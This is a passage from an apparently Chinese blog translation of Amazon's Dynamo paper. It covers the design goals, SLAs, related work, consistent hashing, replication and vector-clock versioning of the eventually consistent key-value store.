对使用它的服务有如下几点假设。</p><h4 id="查询模型（Query-Model）"><a href="#查询模型（Query-Model）" class="headerlink" title="查询模型（Query Model）"></a>查询模型（Query Model）</h4><p><strong>通过唯一的 key 对数据进行读写</strong>。状态以<strong>二进制对象</strong>（binary objects，e.g. blobs）形式存储，以唯一的 key 索引。</p><p><strong>任何操作都不会跨多个 data items</strong>（数据单元），没有关系型 schema 需求。</p><p>Dynamo 面向的应用<strong>存储的都是相对较小的文件（一般小于 1 MB）</strong>。</p><h4 id="ACID-特性"><a href="#ACID-特性" class="headerlink" title="ACID 特性"></a>ACID 特性</h4><p>ACID（Atomicity, Consistency, Isolation, Durability）是一组保证数据库事务可 靠执行的特性。在数据库领域，对数据的单次逻辑操作（single logical operation） 称为一次事务（transaction）。 我们在 Amazon 的实践表明，让数据仓库支持 ACID 会使得它的可用性（availability） 非常差，工业界和学术界也已经就这一点达成了广泛共识 [5]。</p><p><strong>Dynamo 的目标应用具有这样的特点：如果能给可用性（ACID 里面的 A）带来很大提升 ，那牺牲一些一致性（C）也是允许的</strong>。</p><p>Dynamo 不提供任何隔离保证，并且只允许带单个 key 的更新操作（permit only single key updates）。</p><h4 id="效率（Efficiency）"><a href="#效率（Efficiency）" class="headerlink" title="效率（Efficiency）"></a>效率（Efficiency）</h4><p>系统需要运行在通用硬件（commodity hardware）之上。Amazon 的服务对延迟有着严格的 要求，通常用百分位值（percentile）<code>P99.9</code> 衡量。</p><p>考虑到对状态数据的访问是服务的核心操作之一，我们的存储系统必须满足那些严格的 SLA （见 Section 2.2）。另外，服务要有配置 Dynamo 的能力，以便能满足服务的延迟和吞吐 需求。最终，就是在性能、成本效率、可用性和持久性之间取得折中。</p><h4 id="其他方面"><a href="#其他方面" class="headerlink" title="其他方面"></a>其他方面</h4><p>Dynamo 定位是 Amazon 内部使用，因此我们假设环境是安全的，不需要考虑认证和鉴权 等安全方面的问题。</p><p>另外，<strong>由于设计中每个服务都使用各自的一套 Dynamo，因此 Dynamo 的初始设计规模是 几百个存储节点</strong>。后面会讨论可扩展性限制的问题，以及可能的解决方式。</p><h3 id="2-2-SLA-Service-Level-Agreements"><a href="#2-2-SLA-Service-Level-Agreements" class="headerlink" title="2.2 SLA (Service Level Agreements)"></a>2.2 SLA (Service Level Agreements)</h3><p>要<strong>保证一个应用完成请求所花的时间有一个上限</strong>（bounded time），它所依赖的那些服 务就要有一个更低的上限。<strong>对于给定的系统特性</strong>，其中最主要的是客户端期望的<strong>请求 率分布</strong>（request rate distribution），<strong>客户端和服务端会定义一个 SLA（服务级别 协议）</strong>来作为契约。</p><p>举个简单例子：某个服务向客户端保证，在 500 QPS 的负载下，它处理 <code>99.9%</code> 的请求 所花的时间都在能 <code>300ms</code> 以内。</p><p>在 Amazon 的去中心化的、面向服务的基础设施中，SLA 扮演着重要角色。例如，对购物 页面的一次请求，在典型情况下会使渲染引擎向多达 150 个服务发送子请求，而这些子服 务又都有自己的依赖，最终形成一张多层的（more than one level）调用图（call graph ）。为了保证渲染引擎能在一个上限时间内返回一个页面，调用链中的所有服务就都必须遵 循各自的性能契约（contract）。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-1.png" alt="图 1 Amazon 平台的面向服务架构"></p><p>图 1 是一张简化之后的 Amazon 平台架构图。可以看到，动态 web 内容由页面渲染组件 提供，而它是通过调用其他的一些服务来完成这项工作的。</p><p><strong>每个服务可以选择不同类型的数据仓库（data store）来管理（存储）它们的状态数据， 这些数据仓库只能在各自的服务边界（service boundaries）内访问</strong>。一些服务会通过聚 合其他服务的数据来组合产生一个响应（composite response）。典型情况下，聚合服务（ aggregator service）是无状态的，虽然它们大量使用缓存技术。</p><p>对于面向性能的 SLA（performance oriented SLA），业内一般习惯使用<strong>平均值、中位数 和方差</strong>来描述。但在 Amazon 我们发现，要打造一个让所有用户——而不是大部分用户——都 有良好体验的系统，以上 SLA 并不合适。例如，<strong>如果使用了个性化推荐技术，那用户的 访问历史越多，他的请求被处理的时间就越长，最终落到了性能分布的长尾区</strong>。基于平均 值或中位数的 SLA 并不能反映这种情况。为了解决这个问题，<strong>我们使用了 P99.9 分布。99.9% 这个精度是经过大量实验分析，权衡了成本和性能之后得到的</strong>。 我们在生产环境的实验显示，这比基于均值或中位数的 SLA 有更好的用户体验。</p><p>本文多处都将引用 P99.9 分布，这也显示了 Amazon 的工程师对提高用户体验所做的持续 不断的努力。一些基于均值的论文，我们会在它真正有意义的场景才拿出来作为比较，但我 们自己的工程和优化都不是以<strong>均值 SLA</strong> 为核心的。某些技术，例如 write coordinator（写操作协调者），是完全面向 P99.9 来控制性能的。</p><p><strong>存储系统在构建一个服务的 SLA 中经常扮演着重要角色，尤其是业务逻辑相对轻量的 场景</strong>，Amazon 的服务即属于这一类。因此，<strong>状态管理</strong> 就成了服务的 <strong>SLA 的主要 部分</strong>。</p><p><strong>Dynamo 的设计目标之一就是：允许服务自己控制自己的系统特性</strong>——例如持久性和一 致性——<strong>让服务自己决定如何在功能、性能和成本效率之间取得折中</strong>。</p><blockquote><p>One of the main design considerations for Dynamo is to give services control over their system properties, such as durability and consistency, and to let services make their own tradeoffs between functionality, performance and cost-effectiveness.</p></blockquote><h3 id="2-3-设计考虑"><a href="#2-3-设计考虑" class="headerlink" title="2.3 设计考虑"></a>2.3 设计考虑</h3><p><strong>商业系统中数据复制算法一般都是同步的，以提供一个强一致性的数据访问接口。 为了达到这种级别的一致性，这些算法被迫牺牲了某些故障场景下的数据可用性</strong>。例如， 如果数据有冲突，它们会禁止访问这个数据，直到数据的不一致完全得到了解决。在早期，这 种<strong>复制式数据库</strong>（replicated database）是可以工作的。</p><p>但众所周知，分布式系统是无法同时满足<strong>强一致性、高可用性和正确处理网络故障（CAP ）</strong>这几个条件的 [2, 11]。<strong>因此，系统和应用都需要知道，在什么场景下选择满足什么 特性</strong>。</p><p>对于<strong>服务器和网络故障较高的场景</strong>，可以通过<strong>乐观复制</strong>（optimistic replication ）技术增强<strong>可用性</strong>，在后台将数据变动同步到其他节点，并发更新和失联也是可以容忍 的。这种方式的问题是会<strong>导致数据冲突，需要检测并解决冲突</strong>。而解决数据冲突又会带 来两个额外问题：</p><ul><li>何时解决？</li><li>谁来解决？</li></ul><p><strong>Dynamo 设计为最终一致数据仓库</strong>（eventually consistent data store），即，最终 所有的更新会应用到所有的副本。</p><h4 id="何时解决冲突？"><a href="#何时解决冲突？" class="headerlink" title="何时解决冲突？"></a>何时解决冲突？</h4><p>设计时的一个重要考虑是：<strong>何时解决更新冲突</strong>，例如，是读的时候还是写的时候。</p><blockquote><p>An important design consideration is to decide when to perform the process of resolving update conflicts, i.e., whether conflicts should be resolved during reads or writes.</p></blockquote><p>一些传统的数据仓库是在<strong>写的时候解决冲突</strong>，这样可以<strong>保证读的复杂度很低</strong> [7]。 在这种系统中，任何时候<strong>如果数据仓库不能访问所有（或者大多数）副本，写就会被拒绝</strong>。</p><p>Dynamo 的设计与此相反，它的目标是提供一个<strong>“永远可写”（always writable）</strong>的数据 仓库（例如，一个对写操作高度可用的数据仓库）。对很多 Amazon 服务来说，拒绝写 入会造成很差的用户体验。比如即使发生服务器或网络故障，也应该允许用户往购物车添 加或删除商品。<strong>这个需求使我们将解决冲突的复杂度放到了读操作，以保证写永远不会 被拒绝</strong>。</p><h4 id="谁来解决冲突？"><a href="#谁来解决冲突？" class="headerlink" title="谁来解决冲突？"></a>谁来解决冲突？</h4><p>下一个需要考虑的问题是：<strong>谁来解决冲突</strong>。<strong>数据仓库</strong>和<strong>应用</strong>都可以做这件事情。</p><p><strong>如果由数据仓库来做，那选择会相当受限</strong>。在这种情况下，数据仓库只能使用一些 非常简单的策略，例如<strong>“最后一次写有效”</strong>（last write wins） [22]，来解决更新冲突。</p><p>另一方面，由于<strong>应用理解数据描述的是什么</strong>（application is aware of the data schema），<strong>它可以自主选择对用户体验最好的冲突解决算法</strong>。例如，购物车应用可以选择“ 合并”冲突的版本，返回一个合并后的（unified）购物车。尽管这样可以带来很大的灵活性 ，但一些应用开发者并不想自己实现一套冲突解决机制，因此在这种情况下，解决冲突的问 题就下放给了数据仓库，由后者来选择一些简单的策略，例如 “last write wins”。</p><h4 id="其他设计原则"><a href="#其他设计原则" class="headerlink" title="其他设计原则"></a>其他设计原则</h4><ul><li><strong>增量扩展性</strong>（Incremental scalability）：应当支持<strong>逐机器（节点）扩容</strong>，而 且对系统及运维人员带来的影响尽量小</li><li><strong>对称性</strong>（Symmetry）：<strong>每个节点的职责应该是相同的</strong>，不应当出现某些节点承担 特殊职责或特殊角色的情况。以我们的实践经验，<strong>对称性简化了系统的交付和运维</strong></li><li><strong>去中心化</strong>（Decentralization）：<strong>“去中心化”是“对称性”的进一步扩展</strong>，系统应 该是去中心化的、点对点的，而不应该是集中式控制的。在过去，集中式控制导致了很多 服务故障（outage），我们应当极力避免它。去中心化会使得系统更简单、更具扩展性和 可用性</li><li><strong>异构性</strong>（Heterogeneity）：系统要能够利用到基础设施的异构性。例如，<strong>负载的 分布要和存储节点的能力成比例</strong>。对于逐步加入能力更强的新节点，而不是一次升级所 有节点来说，这种异构支持能力是不可或缺的</li></ul><h2 id="3-相关工作"><a href="#3-相关工作" class="headerlink" title="3. 相关工作"></a>3. 相关工作</h2><h3 id="3-1-点对点系统（Peer-to-Peer-Systems）"><a href="#3-1-点对点系统（Peer-to-Peer-Systems）" class="headerlink" title="3.1 点对点系统（Peer to Peer Systems）"></a>3.1 点对点系统（Peer to Peer Systems）</h3><p>一些点对点（peer-to-peer, P2P）系统关注了<strong>数据存储和分散</strong>（data storage and distribution）的问题。</p><h4 id="P2P-系统"><a href="#P2P-系统" class="headerlink" title="P2P 系统"></a>P2P 系统</h4><p>第一代 P2P 系统，例如 Freenet 和 Gnutella，在文件共享系统（file sharing system） 领域使用广泛。它们都是<strong>非受信（untrusted）P2P 网络</strong>的代表，节点之间的 overlay （网络术语，和 underlay 对应，请参考 Wikipedia 或其他资料，译者注）链路都是随机 （随意）建立的（established arbitrarily）。在这种网络中，一次查询请求通常是<strong>泛 洪（flood）到整张网络，找到尽量多的共享这个数据的节点</strong>。</p><h4 id="结构化-P2P-系统"><a href="#结构化-P2P-系统" class="headerlink" title="结构化 P2P 系统"></a>结构化 P2P 系统</h4><p>P2P 网络到下一代，就是有名的<strong>结构化 P2P 网络</strong>（structured P2P network）。这种 网络使用了全局一致性协议（globally consistent protocol），保证<strong>任何一个节点可以 高效地将查询请求路由到存储这个数据的节点</strong>。</p><p>Pastry [16] 和 Chord [20] 这样的系统<strong>利用路由机制可以保证查询在若干（有上限） 跳</strong>（a bounded number of hops）之内收到应答。</p><p>为了减少多跳（multi-hop）路由带来的额外延迟，一些 P2P 系统（例如 [14]）使用了 <strong>O(1)路由机制</strong>，在这种机制中，<strong>每个节点维护了足够多的路由信息</strong>，因此它可以 将（访问数据的）请求在常量跳数（constant number of hops）内路由到合适的对端节点 。</p><p>包括 Oceanstore [9] 和 PAST [17] 在内的很多存储系统都是构建在这种路由（routing） overlay 之上的。Oceanstore 提供全球分布的、事务型的、持久的存储服务，支持分布在 很大地理范围内的副本的串行化更新（serialized updates on widely replicated data） 。<strong>为了支持并发更新，同时避免广域锁</strong>（wide-are locking）内在的一些问题，它使用了一 种基于冲突解决（conflict resolution）的更新模型。conflict resolution 在 [21] 中 提出，用于减少事务异常中止（transaction abort）的数量。<strong>Oceanstore 处理冲突的方式是 ：对并发更新进行排序（order），将排好序的若干个更新作为原子操作应用到所有副本</strong>。 Oceanstore 是为在<strong>不受信的基础设施上做数据复制的场景</strong>设计的。</p><p>作为对比，PAST 是在 Pastry 之上提供了一个简单的抽象层，以此来提供持久和<strong>不可变对 象</strong>（persistent and immutable objects）。它假设<strong>应用可以在它之上构建自己需要的 存储语义</strong>（storage semantics）（例如可变文件）。</p><h3 id="3-2-分布式文件系统与数据库"><a href="#3-2-分布式文件系统与数据库" class="headerlink" title="3.2 分布式文件系统与数据库"></a>3.2 分布式文件系统与数据库</h3><p>文件系统和数据库系统领域已经对<strong>通过分散数据（distributing data）来提高性能、可 用性和持久性</strong>进行了广泛研究。和 <strong>P2P 存储系统只支持扁平命名空间</strong>（flat namespace）相比，<strong>典型的分布式文件系统都支持层级化的命名空间</strong>（hierarchical namespace）。</p><ul><li>Ficus [5] 和 Coda [19] 这样的系统通过文件复制来提高可用性，代价是牺牲一致性。 解决更新冲突一般都有各自特殊的解决方式</li><li>Farsite [1] 是一不使用中心式服务器（例如 NFS）的分布式文件系统，它通过复制实现 高可用和高扩展</li><li><strong>Google File System</strong> [6] 是另一个分布式文件系统，用于存储 Google 内部应用的 状态数据。GFS 的设计很简单，一个主节点（master）管理所有元数据，数据进行分片（ chunk），存储到不同数据节点（chunkservers）。</li><li>Bayou 是一个分布式关系型数据库系统，允许在失联情况下进行操作（disconnected operation），提供最终一致性</li></ul><p>在这些系统中，Bayou、Coda 和 Ficus 都支持失联情况下进行操作，因此对网络分裂和宕 机都有很强的弹性，它们的不同之处在于如何解决冲突。例如，Coda 和 Ficus 在系统层面 解决（system level conflict resolution），而 Bayou 是在应用层面（application level）。相同的是，它们都提供最终一致性。与这些系统类似，<strong>Dynamo 允许在网络发生 分裂的情况下继续执行读写操作，然后通过不同的冲突解决机制来处理更新冲突</strong>。</p><p>分布式块存储系统（distributed block storage system），例如 FAB [18]，将一个大块 分割成很多小块并以很高的可用性的方式存储。和这类系统相比，<strong>我们的场景更适合使用键 值存储</strong>，原因包括：</p><ul><li>系统定位是<strong>存储相对较小的文件</strong>（ <code>size &lt; 1 MB</code>）</li><li><strong>键值存储</strong>（key-value store）更容易在应用级别<strong>针对单个应用</strong>（per-application）进行配置</li></ul><p>Antiquity 是一个广域分布式文件系统，设计用于处理多个服务器挂掉的情况 [23]。它使 用<strong>安全日志</strong>（secure log）保证数据完整性，在不同服务器之间复制 secure log 来保 证持久性（durability），使用<strong>拜占庭容错协议</strong>（Byzantine fault tolerance protocols）保证数据一致性。与此不同，<strong>Dynamo 并不将数据完整性和安全性作为主要关 注点，因为我们面向的是受信环境</strong>。</p><p><strong>Bigtable 是一个管理结构化数据</strong>（structured data）的分布式文件系统，它维护了一 张稀疏的多维有序映射表（sparse, multi-dimensional sorted map），允许应用通过多重 属性访问它们的数据（access their data using multiple attributes） [2]。与此不同 ，<strong>Dynamo 面向的应用都是以 key&#x2F;value 方式访问数据的，我们的主要关注点是高可用</strong> ，即使在发生网络分裂或服务器宕机的情况下，写请求也是不会被拒绝的。</p><p>传统的复制型关系数据库系统（replicated relational database systems）都将关注点放 在<strong>保证副本的强一致性</strong>。虽然强一致性可以<strong>给应用的写操作提供方便的编程模型</strong>， 但导致系统的扩展性和可用性非常受限 [7]，无法处理网络分裂的情况。</p><h3 id="3-3-讨论"><a href="#3-3-讨论" class="headerlink" title="3.3 讨论"></a>3.3 讨论</h3><p>Dynamo 面临的需求使得它与前面提到的集中式存储系统都不相同。</p><p>首先，Dynamo 针对的主要是<strong>需要“永远可写的”（always writable）数据仓库的应用</strong>， 即使发生故障或并发更新，写也不应该被拒绝。对于 Amazon 的很多应用来说，这一点是非 常关键的。</p><p>第二，Dynamo 构建在<strong>受信的、单一管理域的基础设施</strong>之上。</p><p>第三，使用 Dynamo 的应用<strong>没有层级命名空间（hierarchical namespace）的需求</strong>（这是很 多文件系统的标配），也没有复杂的关系型 schema 的需求（很多传统数据库都支持）。</p><p>第四，Dynamo 是为<strong>延迟敏感型应用</strong>（latency sensitive application）设计的，至少 <code>99.9%</code> 的读写操作都要在几百毫秒内完成。为了到达如此严格的响应要求，在多节点 之间对请求进行路由的方式（被很多分布式哈希表系统使用，例如 Chord 和 Pastry ）就无法使用了。因为多跳路由会增加响应时间的抖动性，因此会增加长尾部分的延迟。 Dynamo 可以被描述为：一个<strong>零跳（zero hop）分布式哈希表（DHT）</strong>，每个节点在本地 维护了足够多的路由信息，能够将请求直接路由到合适节点。</p><h2 id="4-系统架构"><a href="#4-系统架构" class="headerlink" title="4. 系统架构"></a>4. 系统架构</h2><p>生产级别的存储系统的架构是很复杂的。除了最终存储数据的组件之外，系统还要针对下列 方面制定可扩展和健壮的解决方案：负载均衡、成员管理（membership）、故障检测、故障 恢复、副本同步、过载处理（overload handling）、状态转移、并发和任务调度、请求 marshalling、请求路由（routing）、系统监控和告警，以及配置管理。</p><p>详细描述以上提到的每一方面显然是不可能的，因此本文将关注下面几项 Dynamo 用到的分 布式系统核心技术：</p><ul><li>partitioning（分区，经哈希决定将数据存储到哪个&#x2F;些节点）</li><li>复制（replication）</li><li>版本化（versioning）</li><li>成员管理（membership）</li><li>故障处理（failure handling）</li><li>规模扩展（scaling）</li></ul><p><img src="https://cdn.bugwz.com/dynamo-table-1.png" alt="表 1 总结了 Dynamo 使用的这些技术及每项技术的好处"></p><h4 id="Partition"><a href="#Partition" class="headerlink" title="Partition"></a>Partition</h4><ul><li>技术：<strong>一致性哈希</strong></li><li>好处：增量可扩展性</li></ul><h4 id="写高可用"><a href="#写高可用" class="headerlink" title="写高可用"></a>写高可用</h4><ul><li>技术：读时协调（解决冲突）的<strong>向量时钟</strong>（vector clocks with reconciliation during reads）</li><li>好处：version size（？）和更新频率（update rates）解耦</li></ul><h4 id="短时故障处理"><a href="#短时故障处理" class="headerlink" title="短时故障处理"></a>短时故障处理</h4><ul><li>技术：<strong>宽松的选举和 hinted handoff</strong>（移交给其他节点处理，附带提示信息）</li><li>好处：部分副本不可用时，仍然可以提供高可用性和持久性</li></ul><h4 id="持久（permanent）故障恢复"><a href="#持久（permanent）故障恢复" class="headerlink" title="持久（permanent）故障恢复"></a>持久（permanent）故障恢复</h4><ul><li>技术：<strong>基于 Merkle tree 的逆熵</strong>（anti-entropy）</li><li>好处：后台同步版本不一致的副本</li></ul><h4 id="成员管理和故障检测"><a href="#成员管理和故障检测" class="headerlink" title="成员管理和故障检测"></a>成员管理和故障检测</h4><ul><li>技术：<strong>基于 Gossip 的成员管理协议和故障检测</strong></li><li>好处：保持了<strong>架构的对称性</strong>，无需一个中心组件（centralized registry）来存储成员和节点状态等信息</li></ul><h3 id="4-1-系统接口"><a href="#4-1-系统接口" class="headerlink" title="4.1 系统接口"></a>4.1 系统接口</h3><p>Dynamo 存储键值对象的接口非常简单，它提供两个操作：</p><ul><li><code>get()</code></li><li><code>put()</code></li></ul><p><code>get(key)</code> 会定位到存储系统中 <code>key</code> 对应的所有对象副本，<strong>返回对象</strong> ——可能是单个对 象，也可能是一个对象列表（有冲突情况下，包括了所有版本）—— <strong>以及一个 context（ 上下文）</strong>。</p><p><code>put(key)</code> 确定对象应该存放的位置，然后写到相应的磁盘。</p><p><code>context</code> 包含了系统中对象的元数据，例如对象的版本，<strong>对调用方是不透明的</strong>（ opaque）。<strong>上下文信息是和对象存储在一起的</strong>，这样系统很<strong>容易验证 put 请求的 context 是否合法</strong>。</p><p>Dynamo <strong>将调用方提供的 key 和对象都视为不透明的字节序列</strong>（opaque array of bytes） 。它<strong>对 key 应用 MD5 哈希得到一个 128bit 的 ID，并根据这个 ID 计算应该存储 到哪些节点</strong>。</p><blockquote><p>Dynamo treats both the key and the object supplied by the caller as an opaque array of bytes. It applies a MD5 hash on the key to generate a 128-bit identifier, which is used to determine the storage nodes that are responsible for serving the key.</p></blockquote><h3 id="4-2-数据分散（Partitioning）算法"><a href="#4-2-数据分散（Partitioning）算法" class="headerlink" title="4.2 数据分散（Partitioning）算法"></a>4.2 数据分散（Partitioning）算法</h3><p>Dynamo 的核心需求之一是：系统必须支持<strong>增量扩展</strong>（scale incrementally）。 这就要求有一种机制能够将数据分散到系统中的不同的节点（例如，以一台机器作为一个 节点的维度）上。</p><p>Dynamo 的<strong>分散方案基于一致性哈希</strong> [10]。在一致性哈希中，哈希函数的<strong>输出是一个 固定的范围，通常作为一个循环空间，或称环（ring）</strong>。<strong>每个节点都会随 机分配一个在这个循环空间内的值</strong>，这个值代表了节点在这个环上的位置。</p><p>用如下方式找到一个数据项（data item）对应的存储节点：</p><ol><li>首先对它的 key 做哈希得到一个哈希值</li><li>然后，在环上沿着顺时针方向找到第一个<strong>所带的值比这个哈希值更大的节点</strong>（前面 提到每个节点都会被分配一个值）</li></ol><p>即，每个节点要负责环上从它自己到它的下一个节点之间的区域。<strong>一致性哈希的主要好处是 ：添加或删除节点只会影响相邻的节点，其他节点不受影响。</strong></p><blockquote><p>The principle advantage of consistent hashing is that departure or arrival of a node only affects its immediate neighbors and other nodes remain unaffected.</p></blockquote><p>但是，<strong>初级的一致性哈希算法在这里是有一些问题的</strong>。 首先，给每个节点随机分配一个位置会导致数据和负载的非均匀分布。 其次，初级的一致性哈希算法没有考虑到节点的异构因素，导致性能不理想。</p><p>为了解决这些问题，Dynamo 使用了一致性哈希的一个变种（和 [10, 20] 的类似）：<strong>每个 节点并不是映射到环上的一个点，而是多个点</strong>。</p><blockquote><p>Intead of mapping a node to a single point in the circle, each node gets assigned to multiple points in the ring.</p></blockquote><p>为了实现这种设计，Dynamo 使用了<strong>虚拟节点</strong>（virtual node）的概念。一个虚拟节点 看上去和一个普通节点一样，但<strong>实际上可能管理不止一台虚拟节点</strong>。具体来说， <strong>当一个新节点添加到系统后，它会在环上被分配多个位置（对应多个 token）</strong>。 我们会在 Section 6 介绍 Dynamo 分散策略（算法）的深入调优 。</p><p><strong>虚拟节点可以代来如下好处</strong>：</p><ol><li>当一个节点不可用时（故障或例行维护），这个节点的负载会均匀分散到其他可用节点上</li><li>当一个节点重新可用时，或新加入一个节点时，这个节点会获得与其他节点大致相同的 负载</li><li>一个节点负责的虚拟节点的数量可用根据节点容量来决定，这样可用充分利用物理基础 设施中的异构性信息</li></ol><h3 id="4-3-数据复制（Replication）"><a href="#4-3-数据复制（Replication）" class="headerlink" title="4.3 数据复制（Replication）"></a>4.3 数据复制（Replication）</h3><p>为了实现高可用性和持久性，Dynamo 将数据复制到多台机器上。每个数据会被复制到 N 台 机器，这里的 N 是每套 Dynamo 可以自己配置的。</p><p>上节介绍到，<strong>每个 key k，会被分配一个 coordinator（协调者）</strong>节点。 coordinator <strong>负责落到它管理的范围内的数据的复制</strong>。它除了自己存储一份之外，还会 在环上顺时针方向的其他 <code>N-1</code> 个节点存储一份副本。因此在系统中，每个节点要负责从 它自己往后的一共 N 个节点。</p><p>例如，图 2 中，B 除了自己存储一份之外，还会将其复制到 C 和 D 节点。因此，D 实际 存储的数据，其 key 的范围包括 <code>(A, B]</code>、<code>(B, C]</code> 和 <code>(C, D]</code>（例如，落在 <code>(A, B]</code> 范围内的 key 会沿顺时针方向找到第一个值比它大的节点，因此找到的是 B，而 B 会 将自己存储的数据复制到 C 和 D，因此 D 会包含 key 在 <code>(A, B]</code> 范围内的对象。其他 几个范围也是类似的。译者注）。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-2.png" alt="图 2 Dynamo 哈希环上 key 的分散（partition）和复制（replication）"></p><p>存储某个特定 key 的所有节点组成一个列表，称为 <strong>preference list</strong>（优先列表）。 我们在 4.8 节会看到，Dynamo 的设计是，<strong>对于给定的 key，每个节点都能决定哪些 节点可以进入这个列表</strong>。<strong>为了应对节点失败的情况，preference list 会包含多余 N 个节 点</strong>。</p><p>另外注意，由于我们引入了虚拟节点，存储一个 key 的 N 个节点，实际上对应的物理节 点可能少于 N 个（例如，一个节点可能会占用环上的不止一个节点）。为了避免这个问题 ，<strong>preference list 在选择节点的时候会跳过一些位置，以保证 list 里面的节点都在不 同的物理节点上</strong>。</p><h3 id="4-4-数据版本化（Data-Versioning）"><a href="#4-4-数据版本化（Data-Versioning）" class="headerlink" title="4.4 数据版本化（Data Versioning）"></a>4.4 数据版本化（Data Versioning）</h3><p>Dynamo 提供最终一致性，所有更新操作会异步地传递给所有的副本。</p><p><code>put()</code> 操作返回时，数据（更新）可能还没有应用到所有副本，因此紧接着的 <code>get()</code> 操作可能获取不到最新数据。在没有故障的情况下，传递更新的耗时有一个上限；但在特定 故障场景下（例如服务器宕机或网络分裂），更新可能会在限定的时间内无法传递到所有副 本。</p><p>Amazon 有些应用是可以容忍这种不一致性的，应用在这种情况下能继续运行。例如，购物 车应用要求“添加到购物车”的请求永远不能被丢失或拒绝。如果购物车的最新状态不可用， 而用户对一个稍老版本的购物车状态做了修改，那这种修改也是有意义的，需要保留；但它 不能直接覆盖最新的状态，因为最新的状态中可能也有一些修改需要保留。这里要注意，不 管是“添加到购物车”还是“从购物车删除”，在系统中转换成的都是 Dynamo 的 <code>put()</code> 操作 。如果最新的状态不可用，而用户又基于稍的大版本做了修改，那这两个版本都需要保留， 由随后的步骤来处理更新冲突。</p><h4 id="如何解决更新冲突"><a href="#如何解决更新冲突" class="headerlink" title="如何解决更新冲突"></a>如何解决更新冲突</h4><p>为了满足以上需求，Dynamo <strong>将每次修改结果都作为一个新的、不可变的版本</strong>。</p><blockquote><p>Dynamo treats the result of each modification as a new and immutable version of the data.</p></blockquote><p>即，允许系统中同时存在多个不同版本。</p><h5 id="冲突调和（使一致化）方式"><a href="#冲突调和（使一致化）方式" class="headerlink" title="冲突调和（使一致化）方式"></a>冲突调和（使一致化）方式</h5><ul><li>syntactic reconciliation（<strong>基于句法的调和</strong>）</li><li>semantic reconciliation（<strong>基于语义的调和</strong>）</li></ul><p>在<strong>大部分情况下，新版本都包含老版本的数据，而且系统自己可以判断哪个是权威版本</strong> （syntactic reconciliation）。</p><p>但是，在发生故障并且存在并发更新的场景下，版本会发生分叉（version branching）， 导致冲突的对象版本。<strong>系统本身无法处理这种情况，需要客户端介入，将多个分支合并成 一个</strong>（semantic reconciliation）。一个典型的例子是：合并多个不同版本的购物车。 有了这种调和机制（reconciliation mechanism），“添加到购物车”操作就永远不会失败 ；但是，这种情况会导致<strong>已经删除的商品偶尔又在购物车中冒出来</strong>（resurface）。</p><p>有很重要的一点需要注意：某些故障模式（failure mode）会导致存在多个冲突的版本，而 不仅仅是两个。服务器故障或网络分裂会导致一个对象有多个版本，每个版本有各自的子历 史（version sub-histories），随后要由系统来将它们一致化。这需要<strong>将应用 设计为：显式承认多版本存在的可能性（以避免丢失任何更新）</strong></p><h5 id="向量时钟"><a href="#向量时钟" class="headerlink" title="向量时钟"></a>向量时钟</h5><p><strong>Dynamo 使用向量时钟（vector clock）[12] 来跟踪同一对象不同版本之间的因果性</strong>。 一个向量时钟就是一个 <code>(node, counter)</code> 列表。一个向量时钟关联了一个对象的所有版 本，可以通过它来判断对象的两个版本是否在并行的分支上，或者它们是否有因果关系。 <strong>如果对象的第一个时钟上的所有 counter 都小于它的第二个时钟上的 counter，那第一个 时钟就是第二的祖先，可以安全的删除；否则，这两个修改就是有冲突的，需要 reconciliation</strong>。</p><p>在 Dynamo 中，<strong>客户端更新一个对象时，必须指明基于哪个版本进行更新</strong>。流程是先执 行读操作，拿到 context，其中包含了 vector clock 信息，然后写的时候带上这个 context。</p><p>在处理读请求的时候，如果 Dynamo 能够访问到多个版本，并且无法 reconcile 这些版本 ，那它就会返回所有版本，并在 context 中附带各自的 vector clock 信息。 <strong>基于 context 指定版本更新的方式解决了冲突</strong>，将多个分支重新合并为一个唯 一的新分支。</p><blockquote><p>An update using this context is considered to have reconciled the divergent versions and the branches are collapsed into a single new version.</p></blockquote><h4 id="一个具体例子"><a href="#一个具体例子" class="headerlink" title="一个具体例子"></a>一个具体例子</h4><p>我们通过 图 3 来展示 vector clock 是如何工作的。</p><p><img src="https://cdn.bugwz.com/dynamo-figure-3.png" alt="图 3 一个对象在一段时间内的版本演进"></p><p>首先，客户端写入一个对象。处理这个 key 的写请求的节点 <code>Sx</code> 增加 key 的序列号（计 数），并用这个序列号创建对象的 vector clock。至此，系统有了一个对象 <code>D1</code> 和它的 时钟 <code>[(Sx, 1)]</code>。</p><p>第二步，客户端更新这个对象。假设还是 <code>Sx</code> 处理这个请求。此时，系统有了对象 <code>D2</code> 和它的时钟 <code>[(Sx, 2)]</code>。<code>D2</code> 是 <code>D1</code> 的后代，因此可以覆盖 <code>D1</code>；<strong>但是，D1 在 其他节点上的副本可能还没有看到 D2 这次更新</strong>。</p><p>第三步，假设还是这个客户端，再次更新了对象，并且这次是由另外的一个节点 <code>Sy</code> 处理 请求。此时，系统有了 <code>D3</code> 和它的时钟 <code>[(Sx, 2), (Sy, 1)]</code>.</p><p>接下来，假设另一个客户端读取 <code>D2</code>，并尝试更新它，写请求由另一个节点 <code>Sz</code> 处理。 现在，系统有 <code>D4</code>（<code>D2</code> 的后代），版本 clock 是 <code>[(Sx, 2), (Sz, 1)]</code>。如果一个节 点知道 <code>D1</code> 和 <code>D2</code>，那它收到 <code>D4</code> 和它的 clock 后，就可以断定 <code>D1</code> 和 <code>D2</code> 被同 一个新数据覆盖了，因此可以安全地删除 D1 和 D2。但如果一个节点只知道 <code>D3</code>，那它受 到 <code>D4</code> 后就看不出这两个版本有何因果关系。<strong>换言之，D3 和 D4 各自的改动并没 有反映在对方之中。因此这两个版本都应当被保留，然后交给客户端，由客户端（在下一次 读到时候）执行 semantic reconciliation</strong>。</p><p>现在，假设一些客户端把 <code>D3</code> 和 <code>D4</code> 都读到了（<code>context</code> 会同时显示 <code>D3</code> 和 <code>D4</code> ）。读操作返回的 <code>context</code> 综合了 <code>D3</code> 和 <code>D4</code> 的 clock，即 <code>[(Sx, 2), (Sy, 1), (Sz, 1)]</code>。如果客户端执行 reconciliation，并且节点 <code>Sx</code> 执行协调写（coordinates the write），<code>Sx</code> 会更新自己在 clock 中的序列号。最终新生成的数据 <code>D5</code> 的 clock 格式如下：<code>[(Sx, 3), (Sy, 1), (Sz, 1)]</code>。</p><h4 id="Vector-clock-的潜在问题"><a href="#Vector-clock-的潜在问题" class="headerlink" title="Vector clock 的潜在问题"></a>Vector clock 的潜在问题</h4><p>vector clock 